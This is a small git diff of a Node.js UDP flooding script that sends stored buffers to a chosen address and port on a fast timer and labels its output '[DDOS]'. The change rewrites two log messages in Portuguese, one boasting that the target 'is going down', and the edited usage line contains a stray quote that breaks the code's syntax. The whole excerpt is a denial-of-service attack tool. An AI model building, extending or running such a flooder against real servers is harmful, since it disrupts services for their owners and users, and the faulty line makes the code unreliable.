@@ -22,7 +22,7 @@ fs.readdirSync(buffersPath).forEach((file) => {
 })
 
 if (!address || !port)
-  return console.log('[ERROR] Use: \'node . <address> <port> [<times>]\'')
+  return console.log('[ERROR] node . <ip> <porta> <tempo>'')
 
 client.on('error', (e) => {
   console.log('[ERROR]: ' + e)
@@ -34,6 +34,6 @@ setInterval(() => {
     client.send(buffer ?? '', port, address);
   })
 
-  console.log(`[DDOS] ${address} ${port}`)
+  console.log(`[DDOS] Está a cair ${address}:${port}`)
 }, (1000 / (times <= 0 ? 1000 : times)))
 
